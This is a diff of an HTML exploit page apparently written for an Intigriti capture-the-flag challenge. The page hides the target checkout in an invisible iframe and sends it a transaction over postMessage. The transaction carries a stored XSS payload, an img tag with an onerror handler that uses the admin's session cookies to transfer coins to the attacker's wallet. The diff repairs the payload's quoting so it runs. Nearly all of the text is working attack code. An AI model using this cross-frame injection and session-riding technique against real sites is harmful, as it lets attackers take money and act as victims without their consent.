@@ -2,57 +2,49 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Intigriti Challenge - Money Transfer</title>
+    <title>Intigriti Challenge</title>
 </head>
 <body>
-    <h1>Processing Transaction...</h1>
-    
+    <h1>Exploit Sent...</h1>
     <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:0;height:0;border:0;"></iframe>
 
     <script>
-        // --- CONFIGURATION ---
         const BASE_URL = 'https://challenge-0126.intigriti.io';
-        
-        // ⚠️ PASTE YOUR 1337COIN ADDRESS HERE ⚠️
+        // Your specific wallet address from the logs
         const MY_WALLET = '13303a656bdddcb618e9c24da160327453'; 
 
         const frame = document.getElementById('target');
         
         frame.onload = function() {
-            // Prevent loop
             if (this.src.includes('marketwatch')) return;
 
             setTimeout(() => {
-                
-                // --- THE PAYLOAD ---
-                // This script runs inside the Admin's browser on marketwatch.html.
-                // It silently calls the API to send YOU money.
+                // --- THE FIXED PAYLOAD ---
+                // We use single quotes for the HTML attribute (onerror='...')
+                // We use double quotes inside the JS (method: "POST")
                 
                 const jsCode = `
                     fetch('/api/transaction', {
-                        method: 'POST',
+                        method: "POST",
                         headers: {
-                            'Content-Type': 'application/json'
+                            "Content-Type": "application/json"
                         },
-                        credentials: 'include',
+                        credentials: "include",
                         body: JSON.stringify({
-                            toAddress: '${MY_WALLET}',
-                            currency: '1337COIN',
-                            amount: 1000 
+                            toAddress: "${MY_WALLET}",
+                            currency: "1337COIN",
+                            amount: 1337
                         })
                     })
-                    .then(r => r.json())
-                    .then(data => console.log('Money Sent!', data));
                 `;
 
-                // Flatten the code so it fits in the HTML attribute
+                // Remove newlines
                 const flatCode = jsCode.replace(/\n/g, ' ');
 
-                // The Injection: Break out of title attribute, inject img with onerror trigger
-                const xss = `"><img src=x onerror="${flatCode}">`;
+                // ⚠️ CRITICAL FIX: Note the single quotes around the onerror value
+                const xss = `"><img src=x onerror='${flatCode}'>`;
 
-                // 3. Send the Initial Malicious Transaction (The Carrier)
-                // This puts our XSS payload into the MarketWatch database
+                // Send the malicious transaction
                 frame.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
@@ -62,11 +54,10 @@
                     }
                 }, '*');
 
-                // 4. Redirect the Admin to MarketWatch
-                // When this page loads, the XSS above executes, and the money transfer happens.
+                // Redirect to trigger execution
                 setTimeout(() => {
                     frame.src = BASE_URL + '/marketwatch.html';
-                }, 2000);
+                }, 1500);
 
             }, 2000);
         };
